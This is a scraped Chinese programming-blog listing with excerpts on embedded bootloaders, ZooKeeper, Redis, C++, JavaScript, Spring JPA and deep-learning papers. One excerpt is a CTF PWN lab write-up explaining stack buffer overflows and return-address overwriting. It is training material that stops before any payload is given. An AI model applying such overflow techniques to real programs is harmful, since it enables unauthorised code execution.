/sbin（系统二进制目录）：该目录包含了一些系统级的可执行命令和工具，通常只能由root用户执行。这些命令用于系统管理和维护。
/tmp（临时目录）：该目录用于存储临时文件。这些文件在系统重启时被删除。
/usr（用户应用目录）：该目录包含了用户所安装的应用程序和文件。通常，用户程序的二进制文件存储在/usr/bin目录下。
/var（可变数据目录）：该目录包含了经常变化的数据文件，如系统日志文件、邮件和缓存文件。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e75d2c2f05bd86373944f064744ee67/" rel="bookmark">
			STM32F0实现IAP升级固件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 好几年前写过一篇关于 STM32 bootloader 升级固件的博客，但是使用的芯片是 STM32 F4 系列，升级固件的方式是在外部 flash 的 fat32 文件系统中存入固件文件，reset 后通过特定按键进入 IAP 程序。
最近需要在 STM32 上实现同样的 IAP 功能，但是方式不太一样，也发现一些芯片的差别，在此记录一下。
一、两个工程文件的 Rom/Ram 设置 Bootloader 程序工程文件设置
应用程序工程文件设置
二、关键点 boot 程序在 flash 的前 16KB 的空间，所以应用程序的地址需要向后偏移 16KB 。
应用程序需要把前 192B 留作中断向量表使用，所以需要把真正应用程序的变量向后偏移 0xC0。
在应用程序中，需要定义中断向量表，并且指定其在内存中的位置，类似下面的语句。具体的写法会根据不同的编译器而不同，就算同样是 Keil，MDK5 和 MDK6 的写法也不一样，如下是 MDK 6 的写法。
#define APP_VectStoreAddr "0x20000000" __IO uint32_t VectorTable[48] __attribute__((section(".ARM.__at_"APP_VectStoreAddr)));
从AC5移植到AC6，Keil官方有一个文档特别针对这个有说明，具体链接如下
https://www.keil.com/appnotes/files/apnt_298.pdf
跳转到应用程序以后，需要先将存在 Flash 中的中断向量表拷贝到 IRAM1 中，并且重定向中断向量表。这点 F0 系列和 F4 系列有很大的不同。具体可查看这篇博客。
for(i = 0; i &lt; 48; i++) { VectorTable[i] = *(__IO uint32_t*)(APPLICATION_ADDRESS + (i&lt;&lt;2)); } /* Enable the SYSCFG peripheral clock*/ __HAL_RCC_SYSCFG_CLK_ENABLE(); /* Remap SRAM at 0x00000000 */ __HAL_SYSCFG_REMAPMEMORY_SRAM(); 三、IAP 程序实现 初始化串口，开启中断。等待几秒钟，如果中途接收到指定字符，进入升级界面。否则直接跳转到应用程序。升级是通过串口发送固件，采用 ymodem 协议，官方有教程， AN4065。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05710c30561e71ef3bb9c3574a519147/" rel="bookmark">
			zookeeper安装教程及其基本使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
zookeeper下载：
zookeeper下载官网：
本地安装配置：
启动zookeeper：
开启服务端：
启动客户端：
查看zookeeper的状态：
zoo.cfg文件解读：
zookeeper的集群安装：
报错分析：
选举机制---第一次启动：
部分概念：
选举机制---非第一次启动：
ZK集群的启动与停止脚本：
客户端命令行操作：
参数分析： 节点类型（持久/短暂/有序号/无序号）：
监听器原理：
监听原理详解：
节点的值变化监听：
节点的子节点变化监听（路径变化）:
节点删除与查看:
zookeeper下载： zookeeper下载官网： https://zookeeper.apache.org/ 点击上述，下载3.5.7版本 本地安装配置： 下载到win机上，上传到linux上，再进行解压，修改配置文件（配置文件在conf目录下）
先修改zoo文件的名称：zoo_sample.cfg 修改为 zoo.cfg（sample是模板的意思）
进入zoo.cfg文件进行配置
需要修改dataDir的路径
在zookeeper的目录下自己创建一个目录作为zookeeper的数据与事务日志的存储目录
保存退出
启动zookeeper： 进入zookeeper的bin目录下可以找到下边两个脚本便是启动脚本文件（一个客户端，一个服务端，先启动服务端再启动客户端）
开启服务端： bin/zkServer.sh start 启动客户端： 与服务端不一样，不需要start
进入后：
查看zookeeper的状态： bin/zkServer.sh status zoo.cfg文件解读： tickTime=2000：
通信心跳时间，Zookeeper服务器与客户端心跳时间，单位毫秒
initLimit=10（首次连接时限）：
Leader和Follower初始连接时能容忍的最多心跳数（tickTime的数量）
syncLimit=5（非首次连接时限）：
Leader和Follower之间通信时间如果超过syncLimit * tickTime，Leader认为Follwer死掉，从服务器列表中删除Follwer。
clientPort=2181
客户端连接端口，通常不做修改。
dataDir=/opt/module/zookeeper-3.5.7/zkData
保存Zookeeper中的数据，一般默认temp,默认的目录容易被Linux定期删除
zookeeper的集群安装： 在上边我们已经安装好了本地模式，集群模式只需要我们修改一些配置进行分发到集群的其他服务器上即可。
（1）zkData 目录下创建一个 myid 的文件在文件中添加与 server 对应的编号（相当于唯一标识符）（注意：上下不要有空行，左右不要有空格）
（2）将配置好的文件进行分发
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/05710c30561e71ef3bb9c3574a519147/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6dd8832b73c0d98b24f54b0ba87f7060/" rel="bookmark">
			C&#43;&#43; 对象指针
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.对象指针的一般概念 和基本类型的变量一样，每一个对象在初始化之后都会在内存中占有一定的空间。因此，既可以通过对象名，也可以通过对象地址来访问一个对象。虽然对象同时包含了数据和函数两种成员，与一般变量略有不同，但是对象所占据的内存空间只是用于存放数据成员的，函数成员不在每一个对象中存在副本。对象指针就是用于存放对象地址的变量。 对象指针遵循一般变量指针的各种规则。
（1）声明对象指针
声明对象指针的一般语法形式为：
类名*对象指针名; 例如：
Point p1;//声明Point类的对象p1 Point *pointPtr;//声明Point类的对象指针变量PointPtr PointPtr=&amp;p1;//将对象p1的地址赋给PointPtr,使PointPtr指向p1 （2）使用对象指针访问对象的成员
就像通过对象名来访问对象的成员一样，使用对象指针一样可以方便地访问对象的成员，语法形式为：
对象指针名-&gt;成员名; 这种形式与“(*对象指针名).成员名”的访问形式是等价的。
【例1】使用指针来访问Point类的成员。
class Point//定义Point类 { public://外部接口 Point(int x=0,int y=0):x(x),y(y){}//构造函数 int getX() { return x; }//返回x int getY() { return y; }//返回y private://私有数据 int x, y; }; int main() { Point a(4, 5);//定义并初始化对象a Point* p1 = &amp;a;//定义对象指针p1，用a的地址将其初始化 cout &lt;&lt; p1-&gt;getX() &lt;&lt; endl;//利用指针访问对象成员 cout &lt;&lt; (*p1).getX() &lt;&lt; endl;//利用指针访问对象成员 cout &lt;&lt; a.getX() &lt;&lt; endl;//利用对象名访问对象成员 return 0; } 运行结果：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6dd8832b73c0d98b24f54b0ba87f7060/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37e1aadb16b801d13aa09951f6a7867b/" rel="bookmark">
			Python入门自学进阶-Web框架——38、redis、rabbitmq、git
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		缓存数据库redis：
NoSQL（Not only SQL）泛指非关系型的数据库。为了解决大规模数据集合多重数据类的挑战。
NoSQL数据库的四大分类：
键值（Key-Value）存储数据库列存储数据库文档型数据库图形（Graph）数据库 redis是业界主流的key-value nosql数据库之一。redis主要用在linux类系统。
要在 Ubuntu 上安装 Redis，打开终端，然后输入以下命令：
$sudo apt-get update $sudo apt-get install redis-server 在windows系统下，下载压缩包，解压缩后，就可以直接运行。
解压缩后的Redis-x64-5.0.14.1：
在此目录下运行cmd，在命令窗口运行命令redis-server redis.windows.conf，启动redis服务器
可以看到，服务的端口是6379。此启动方法表示临时服务安装成功。使用该指令创建的服务，不会再window service列表中出现redis服务名，此窗口关闭，临时服务会自动退出
后台服务安装启动指令：redis-server.exe --service-install redis.windows.conf --loglevel verbose（一定要先卸载已经安装的临时或者固定的服务，否则会出现错误）
卸载服务：redis-server --service-uninstall
启动服务指令：redis-server.exe --service-start
如果需要停止就执行 redis-server --service-stop // 停止服务
再打开一个cmd窗口，运行客户端：redis-cli.exe
redis-py 的API的使用可以分类为：
连接方式连接池操作 String 操作Hash 操作List 操作Set 操作Sort Set 操作管道发布订阅 String操作：
使用：set 、get 、 keys *
在使用set时，显示set语法：
set(name, value, ex=None, px=None, nx=False, xx=False)
1
2
3
4
5
6
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/37e1aadb16b801d13aa09951f6a7867b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c13d7b0663aca8715428819521c2ce9/" rel="bookmark">
			论文阅读：ImageNet
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文：ImageNet Classification with Deep Convolutional Neural Networks
基于深度卷积神经网络的ImageNet分类
开始阅读： 摘要： 我们训练了一个大型的深度卷积神经网络，将ImageNet LSVRC-2010竞赛中的120万张高分辨率图像分为1000个不同的类别。在测试数据上，我们实现了前1和前5的错误率分别为37.5%和17.0%，大大优于之前的先进技术。这个神经网络有6000万个参数和65万个神经元，由5个卷积层组成，其中一些是最大池化层，还有3个完全连接的层，最后是1000路softmax。为了使训练更快，我们使用了非饱和神经元和一个非常高效的GPU实现卷积操作。为了减少全连接层的过拟合，我们采用了最近开发的一种称为“dropout”的正则化方法，该方法被证明非常有效。我们还在ILSVRC-2012比赛中输入了该模型的一个变体，并获得了前5名的15.3%的测试错误率，而第二名的错误率为26.2%。
介绍： 当前的目标识别方法基本使用了机器学习方法。为了提高它们的性能，我们可以收集更大的数据集，学习更强大的模型，并使用更好的技术来防止过拟合。直到最近，标记图像的数据集相对较小，大约为数万张图像。使用这种大小的数据集可以很好地解决简单的识别任务，特别是如果它们使用保持标签的转换进行增强。例如，目前MNIST数字识别任务的最佳错误率(&lt;0.3%)接近人类的表现。使用这种大小的数据集可以很好地解决简单的识别任务，特别是如果它们使用保持标签的转换进行增强。例如，目前MNIST数字识别任务的最佳错误率(&lt;0.3%)接近人类的表现。
但现实环境中的物体表现出相当大的可变性，因此要学会识别它们，有必要使用更大的训练集。事实上，小型图像数据集的缺点已经被广泛认识到(例如，Pinto等[21])，但直到最近才有可能收集具有数百万图像的标记数据集。新的更大的数据集包括LabelMe[23]，它由数十万张完全分割的图像组成，以及ImageNet[6]，它由超过22,000个类别的超过1500万张标记的高分辨率图像组成。
为了从数百万张图像中学习数千个对象，我们需要一个具有大学习能力的模型。然而，物体识别任务的巨大复杂性意味着即使是像ImageNet这样大的数据集也不能指定这个问题，因此我们的模型还应该有大量的先验知识来弥补我们没有的所有数据。卷积神经网络(cnn)就是这样一类模型。它们的能力可以通过改变它们的深度和广度来控制，并且它们还对图像的性质(即统计数据的平稳性和像素依赖性的局部性)做出强有力且大多数正确的假设。
因此，与具有类似大小层的标准前馈神经网络相比，cnn的连接和参数要少得多，因此更容易训练，而它们的理论最佳性能可能只会稍微差一点。
本文的具体贡献如下:我们在ILSVRC-2010和ILSVRC-2012比赛中使用的ImageNet子集上训练了迄今为止最大的卷积神经网络之一[2]，并取得了迄今为止在这些数据集上报道的最佳结果。我们编写了一个高度优化的GPU实现，用于2D卷积和训练卷积神经网络中固有的所有其他操作，我们将其公开。我们的网络包含了许多新的和不寻常的特征，这些特征可以提高其性能并减少其训练时间，具体内容见第3节。我们的网络的规模使得过拟合成为一个重要的问题，即使有120万个标记的训练样例，所以我们使用了几种有效的技术来防止过拟合，这些技术将在第4节中描述。我们最终的网络包含五个卷积层和三个全连接层，这个深度似乎很重要:我们发现删除任何卷积层(每个层包含不超过模型参数的1%)都会导致性能下降。
数据集 在ImageNet上，习惯上报告两个错误率:top-1和top-5，其中top-5错误率是正确标签不在模型认为最可能的五个标签中的测试图像的比例。
体系结构 我们的网络架构如图2所示。它包含八个学习层——五个卷积层和三个全连接层。下面，我们将描述我们的网络架构的一些新颖或不寻常的特性。3.1-3.4节按照我们对其重要性的估计进行排序，最重要的放在前面。
ReLU非线性 将神经元的输出f作为其输入x的函数建模的标准方法是f(x) = tanh(x)或f(x) = (1 + e - x)−1。就梯度下降的训练时间而言，这些饱和非线性比非饱和非线性f(x) = max(0;x)慢很多。根据Nair和Hinton[20]，我们将具有这种非线性的神经元称为整流线性单元(relu)。使用relu的深度卷积神经网络（非饱和）的训练速度比使用tanh单元的深度卷积神经网络（饱和）快几倍。图1演示了这一点，图1显示了特定四层卷积网络在CIFAR-10数据集上达到25%训练误差所需的迭代次数。这张图表明，如果我们使用传统的饱和神经元模型，我们将无法对如此大的神经网络进行实验。
图1:具有relu(实线)的四层卷积神经网络在CIFAR-10上的训练错误率为25%，比具有tanh神经元(虚线)的等效网络快6倍。每个网络的学习率是独立选择的，以使训练尽可能快。没有采用任何形式的正规化。这里所展示的效果的大小随网络结构的不同而不同，但具有relu的网络始终比具有饱和神经元的网络学习速度快几倍
在多个gpu上进行训练 单个GTX 580 GPU只有3GB的内存，这限制了可以在其上训练的网络的最大大小。事实证明，120万个训练样本足以训练一个GPU无法容纳的网络。因此，我们将网络分散到两个gpu上。当前的gpu特别适合跨gpu并行化，因为它们能够直接从彼此的内存中读取和写入，而无需通过主机内存。我们采用的并行化方案实际上是将一半的内核(或神经元)放在每个GPU上，还有一个额外的技巧:GPU只在某些层进行通信。这意味着，例如，第3层的内核从第2层的所有内核映射中获取输入。然而，第4层的内核只从位于同一GPU上的第3层的内核映射中获取输入。选择连接模式是交叉验证的一个问题，但这允许我们精确地调整通信量，直到它是计算量的一个可接受的部分。
与在一个GPU上训练每个卷积层的核数减半的网络相比，该方案将我们的前1和前5错误率分别降低了1.7%和1.2%。双gpu网络比单gpu网络的训练时间稍短。
局部响应归一化 relu具有理想的特性，即它们不需要输入归一化来防止它们饱和。如果至少有一些训练样例对ReLU产生了正输入，则学习将在该神经元中发生。然而，我们仍然发现下面的局部归一化方案有助于泛化。
重叠的池化 cnn中的池化层对同一核映射中相邻神经元组的输出进行汇总。传统上，相邻池化单元所概括的邻域不重叠。更精确地说，池化层可以被认为是由间隔为5个像素的池化单元网格组成，每个池化单元以池化单元的位置为中心，总结了一个大小为z × z的邻域。如果我们设s = z，我们就得到了cnn中常用的传统的局部池化。如果我们设s &lt; z，我们得到重叠池化。这是我们在整个网络中使用的，s = 2, z = 3。与不重叠方案s = 2相比，该方案将前1和前5的错误率分别降低了0.4%和0.3%;Z = 2，产生同等尺寸的输出。我们通常在训练过程中观察到，有重叠池化的模型发现过拟合稍微困难一些
总体架构 现在我们准备描述CNN的整体架构。如图2所示，网络包含8层权重;前五个是卷积的，其余三个是完全连接的。最后一个完全连接层的输出被馈送到一个1000路softmax，它产生1000个类标签的分布。我们的网络最大化多项逻辑回归目标，这相当于最大化正确标签在预测分布下的对数概率的跨训练案例的平均值。
第二层、第四层和第五层卷积层的内核只连接到位于同一GPU上的前一层的内核映射(见图2)。第三层卷积层的内核连接到第二层的所有内核映射。全连接层中的神经元与前一层中的所有神经元相连。响应归一化层遵循第一层和第二层卷积层。第3.4节中描述的最大池化层遵循响应归一化层和第五个卷积层。将ReLU非线性应用于每个卷积层和全连接层的输出
ps“有关全连接层 卷积层这些的概念GitHub (zhihu.com)
我们的CNN架构的插图，明确地显示了两个gpu之间的职责划分。一个GPU运行图顶部的层部件，而另一个运行图底部的层部件。gpu只在某些层通信。网络的输入是150,528维，网络剩余层的神经元数量由253,440-186,624-64,896-64,896-43,264 - 4096-4096-1000给出
减少过度拟合 我们的神经网络架构有6000万个参数。尽管ILSVRC的1000个类使每个训练样例对从图像到标签的映射施加10位约束，但事实证明，这不足以在没有相当大的过拟合的情况下学习如此多的参数。下面，我们将描述两种对抗过拟合的主要方法。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5c13d7b0663aca8715428819521c2ce9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02bcbc1f5298621f2d9c3768f5705bdb/" rel="bookmark">
			Unity WebGL&#43;jslib实现与js通信（例.图片下载）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、项目配置 按照上一篇文章配置即可
二、调用测试 1.新建jslib,我这里用txt新建。
mergeInto(LibraryManager.library, { Hello: function () { window.alert("Hello, world!"); }, HelloString: function (str) { window.alert(Pointer_stringify(str)); }, HelloFloat: function () { return 1; }, }); 2.如果遇到打包时报错，检测编码格式
3. 将jslib放入Unity-Plugins文件夹下
4.C#端代码，引入Dll
[DllImport("__Internal")] private static extern void Hello(); [DllImport("__Internal")] private static extern void HelloString(string str); [DllImport("__Internal")] private static extern float HelloFloat(); 5.C#端代码，调用
Hello(); HelloString("This is a string."); HelloFloat(); 6.打包测试，注意Editor模式运行会报错EntryPointNotFoundException。需要打包运行测试。
三、下载图片 1.对应jslib如下：
var ImageDownloaderPlugin = { ImageDownloader: function (str, fn) { console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/02bcbc1f5298621f2d9c3768f5705bdb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a9824bdcd9010eee2c796e1b058c10f/" rel="bookmark">
			webpack5&#43;crypto
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		测试 webpack 5 兼容性 webpack4 有以下设置
node: { Buffer: false, process: false, }, 而webpack 5 从配置中移除了这些选项，并始终赋值 false。
那么 在项目中使用了 node 内置模块应该怎么配置？
例如项目中 使用了crypto const crypto = require('crypto') 运行后报错：
Module not found: Error: Can't resolve 'crypto' in 'xxx' BREAKING CHANGE: webpack &lt; 5 used to include polyfills for node.js core modules by default. This is no longer the case. Verify if you need this module and configure a polyfill for it.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2a9824bdcd9010eee2c796e1b058c10f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/323581c99d7f61d77a1e5675fe7c0464/" rel="bookmark">
			学了一个礼拜 JavaScript 为什么还是学不会？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 首先从你的描述里面我先以我的主观臆断来猜测一下你是没有任何编程的基础的，Js按理来说在各语言中并不是非常难学，当然如果你是纯新手入门，那么确实前期需要时间来沉淀一下语法，一个礼拜的话，按理来说应该是在沉淀的阶段中，不要因为前期的一些困难而泄气，新手觉得难是正常的，其次，也不要太注重别人的学习进度，我觉得这可能是让你操之过急、静不下心的原因之一，注重自身的缺陷，哪个知识点不懂网上会有很多的讲得通俗易懂的文章或视频，资源千千万，但能不能利用好看个人，js部分的知识个人认为讲究个循循渐进，哪一部分不行就补那一部分，下面是我整理的Js的知识导图，可以配合网上教程食用，希望对你有帮助~
先放上路线图
部分重要知识点 基础性知识 ·声明变量
·null 和 undefined
·详解JavaScript严格模式
运算符&amp;流程控制 · 运算符
·三大流程控制语句
数组 ·数组基础知识点
·数组操作函数汇总
对象 ·对象详解教程
Set集合 ·Set对象
· WeakSet
Map · Map对象
· WeakMap
函数进阶 ·函数声明的几种形式及用法
·立即执行函数（IIFE）
· 函数参数——深入理解参数传递、参数默认值、参数的收集与展开
·JS如何使用递归？
·全面解析this关键字
####
作用域和闭包 · 执行上下文和执行栈
·作用域和作用域链
·闭包的概念、原理、作用及应用
原型与继承 ·原型与原型链
·常用八种继承方案
类 ·类(class) 基础知识
·Static 方法
·类继承
模块化 模块化—模块暴露与模块引入
正则表达式 ·正则表达式语法大全
·全网最全JavaScript正则表达式( 校验数字和字母)
Promise ·理解JavaScript Promise
·帮你弄懂Promise原型方法then、catch、finally
·图解 Promise 实现原理—— Promise 链式调用 、
·理解 JavaScript 的 async/await )
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/323581c99d7f61d77a1e5675fe7c0464/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d1b73a462906bc422550fda8673d35c5/" rel="bookmark">
			CTF PWN练习之返回地址覆盖
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天进行的实验是CTF PWN练习之返回地址覆盖，来体验一下新的溢出方式。
学习地址覆盖之前还有些小知识需要掌握，不然做题的时候你肯定一脸懵逼,首先是函数调用约定，然后还要知道基本的缓冲区溢出攻击模型。
函数调用约定
函数调用约定描述了函数传递参数的方式和栈协同工作的技术细节，不同的函数调用约定原理基本相同，但在细节上是有差别的，包括函数参数的传递方式、参数的入栈顺序、函数返回时由谁来平衡堆栈扥。本实验中着重讲解C语言函数调用约定。
通过前面几个PWN系列实验的学习，我们可以发现在gdb中通过disas指令对main函数进行反汇编时，函数的开头和结尾的反汇编指令都是一样的：
push %ebp
mov %esp,%ebp
…
leave
ret
在函数大开头，首先是一条push %ebp指令，将ebp寄存器压入栈中，用于保存ebp寄存器的值，接着是mov
%esp,%ebp将esp寄存器的值传递给ebp寄存器；在函数的末尾，leave指令相当于mov %ebp,%esp和pop
%ebp两条指令，其作用刚好与开头的两条指令相反，即恢复esp和ebp寄存器的内容。
如果在函数A中调用了函数B，我们称函数A为主调函数，函数B为被调函数，如果函数B的声明为int B(int arg1, int arg2, int
arg3)，那么函数A中的调用函数B时的汇编指令的形式如下：
push arg3
push arg2
push arg1
call B
连续三个push将函数的参数按照从右往左的顺序进行压栈，然后执行call
B来调用函数B。注意在gdb中看到的效果可能不是三个push，而是三个mov来对栈进行操作，这是因为Linux采用AT&amp;T风格的汇编，而上面的指令使用的是Intel风格的汇编，比较容易理解。
call指令的内部细节为：将下一条指令的地址压入栈中，然后跳转到函数B去执行代码。这里说的call下一条指令的地址也就是通常所说的返回地址。函数B最后一条retn指令会从栈上弹出返回地址，并赋值给EIP寄存器，达到返回函数A继续执行的目的。
基本的缓冲区溢出攻击模型
基本的缓冲区溢出攻击通常是通过改写函数返回地址的形式来发起攻击的。如A调用B函数，正常情况下B函数返回时执行retn指令，从栈上取出返回地址跳转回A函数继续执行代码。而一旦返回地址被缓冲区溢出数据改写，那么我们就可以控制函数B跳转到指定的地方去执行代码了。
1. 实验内容和步骤 本文涉及相关实验：[《PWN练习之返回地址覆盖》](https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182014110409173900001&amp;pk_campaign=freebuf-
wemedia)。
做实验前先好好审题，看一下描述。
主机/home/test/5目录下有一个pwn5程序，执行这个程序可以输入数据进行测试，正常情况下程序接收输入数据后不会产生任何输出信息并直接退出，然后当输入一定的数据量时，可能会提示
Segmentation fault
的错误信息，当输入的精心构造的输入数据时可对程序发起溢出攻击，达到改写程序执行流程的目的，攻击成功时将输出如下信息：
Congratulations, you pwned it.
请对pwn5程序进行逆向分析和调试，找到程序内部的漏洞，并构造特殊的输入数据，使之输出成功的提示信息。
使用cd /home/test/5切换到程序所在目录，执行cat pwn5.c即可看到源代码：
#include &lt;stdio.h&gt;
void win()
{
printf(“Congratulations, you pwned it.\n”);
}
int main(int argc, char** argv)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d1b73a462906bc422550fda8673d35c5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1b8493f3cf60f32f430d6e49a7a8a46/" rel="bookmark">
			SpringDataJPA框架使用笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SpringDataJPA框架使用笔记 什么是JPA jpa概念 JPA是Java中用于实现对象关系映射ORM的API标准， JPA提供了一种将JAVA对象映射到关系数据库的方式， 使开发人员可以使用面向对象的方式操作数据库，而不需要编写繁琐的SQL语句。 jpa中的一些概念有： 实体类Entity 实体管理器EntityManager 实体管理器工厂EntityManagerFactory 持久化上下文PersistenceContext 主键PrimaryKey 关系映射Relationship Mapping 查询语言JPQL 一些jpa框架 目前Java开发市场中的JPA框架有： 1.Hibernate 最流行的JPA实现之一，提供了全面的ORM功能，常和Structs2 +Spring一起使用，即SSH技术体系 2.EclipseLink 是Eclipse基金会提供的JPA实现，高性能，可扩展，支持多数据源 3.SpringDataJPA 是Spring提供的JPA实现，可以使用少量代码实现常见的CRUD操作，而无需写复杂的实现代码。 4.OpenJPA 是Apache基金会的一个项目，实现了JPA规范，支持动态代理和动态类增强。 什么是springDataJPA SpringDataJPA是spring框架下的一个模块，用于简化JPA的开发， 它结合了spring框架和JPA的特性，提供了一种简便的方法来访问和操作数据库。 它使用少量的注解和约定，自动实现常见的CRUD操作，减轻了开发负担 SpringDataJPA的一些主要特性： 1.仓库接口Repository Interface SpringDataJPA通过仓库接口来提供数据访问功能， 自定义的xxxRepository需要继承 JpaRepository /CrudRepository/JpaSpecificationExecutor 来获取JPA相关操作功能 2.自定义查询方法 通过springDataJPA方法的命名约定实现自动生成查询，它会根据方法名和参数，自动解析出相应的查询条件，并生成相应的SQL语句执行查询 3.查询创建器 可以在方法名中使用findBy\And\Or等关键字，快速定义复杂的查询条件 4.分页和排序 在查询方法中传递Pageable参数，可以指定需要返回的页数、每页记录数和排序方式 5.对其他数据库和NoSql的支持 除了常见的关系数据库，还支持如MongoDB/Neo4j/ES/Redis等NoSQL数据库 springboot整合JPA操作mysql数据库 xml依赖配置 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; 开启JPA审计功能 @Slf4j // 启注解事务管理，等同于xml配置方式的 &lt;tx:annotation-driven /&gt; @EnableTransactionManagement //启用JPA审计功能-自动写新增时间/修改时间 （插入的时间可以是Date也可以是Long型） @EnableJpaAuditing @SpringBootApplication public class DemoApplication { public static void main(String[] args) { SpringApplication.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b1b8493f3cf60f32f430d6e49a7a8a46/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b83cd4301c62844c0998f82b9d547b2/" rel="bookmark">
			YOLOv5S网络框架设计-CSC&amp;C3&amp;SPPF模块
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		总体框架： 在6.0版本的框架中，Neck和Head是一个整体统称为Head
Yolov5s由Backbone（网络主干）和Head（头部）组成
各个小模块 CBS模块 CBS模块在common.py中定义为Class Conv：
class Conv(nn.Module): # Standard convolution def __init__(self, c1, c2, k=1, s=1, p=None, g=1, act=True): # ch_in, ch_out, kernel, stride, padding, groups super().__init__() self.conv = nn.Conv2d(c1, c2, k, s, autopad(k, p), groups=g, bias=False) self.bn = nn.BatchNorm2d(c2) self.act = nn.SiLU() if act is True else (act if isinstance(act, nn.Module) else nn.Identity()) def forward(self, x): return self.act(self.bn(self.conv(x))) def forward_fuse(self, x): return self.act(self.conv(x)) CBS: C代表Conv，B代表BatchNorm2d，S代表SiLu激活函数
CBS模块封装了卷积、批归一化和激活函数的组合操作
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6b83cd4301c62844c0998f82b9d547b2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ac70a3dfe7a60cb5d36c36b863371fc/" rel="bookmark">
			深度学习——全维度动态卷积ODConv
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ODConv(OMNI-DIMENSIONAL DYNAMIC CONVOLUTION)是一种关注了空域、输入通道、输出通道等维度上的动态性的卷积方法，因此被称为全维度动态卷积。
part1. 什么是动态卷积 动态卷积就是对卷积核进行线性加权
第一篇提出动态卷积的文章也是在SE之后，他提出目前的注意力机制模型主要都是在特征图上做工作，而动态卷积它对多个卷积核进行线性加权，加权值则与输入有关，这就使得动态卷积具有输入依赖性。
也就是说，对于不同的输入，我们使用不同的卷积核。之后对这些不同的卷积核，进行注意力加权。
看这组图片，这是CondConv: Conditionally Parameterized Convolutions for Efﬁcient Inference的作者提出的。
在两种方式的对比下，发现他们的作用是一样的，但是图b中的方法计算量就像是NLnet重复计算的attention map一样，计算量太大，不适合把卷积放在这里去实现所谓的动态，所以作者提出了方法a，也就是condconv。
part2. 动态卷积和注意力机制有什么差别 动态卷积和注意力机制在神经网络中都是常用的技术，但具有不同的作用和目的。
动态卷积是指在卷积过程中，卷积核的权重不是固定的，而是可以根据输入数据的不同而动态调整。这样可以使卷积核能够更好地适应输入数据的特征，提高卷积网络的性能。
注意力机制是一种重要的神经网络模块，可以使神经网络在处理序列数据时能够更好地关注与当前任务相关的信息。注意力机制可以根据输入数据中的关键信息，给予不同的权重，在传递信息时更多地关注这些重要信息。
因此，动态卷积和注意力机制虽然都可以提高神经网络的性能，但其作用不同。动态卷积是加强了特征的适应性，而注意力机制则是更好地关注当前任务需要的信息。
part3.ODConv ODConv的发现其实比较像CA和GC这种注意力机制，都是发现了已有的东西的不足（或许是忽略的什么，或许是发现某些计算不必要）从而提出的改进。
ODConv发现：现有的工作采用单个注意力，输入对于输出卷积核有相同的注意力值，但其他三个维度（关于空间大小、输入通道数和输出通道数） 卷积核的空间维度、输入通道维度以及输出通道维度）都被忽略了。 受此启发，作者提出了全维动态卷积（ODConv）
如下图所示
ODConv在任何卷积和内部采用并行策略，从四个维度来学习卷积核内部的注意力值，从而获得全维度的卷积核注意力值。
下图课一直观的看出，采用了SE的ODConv(b)和普通的动态卷积的对比。
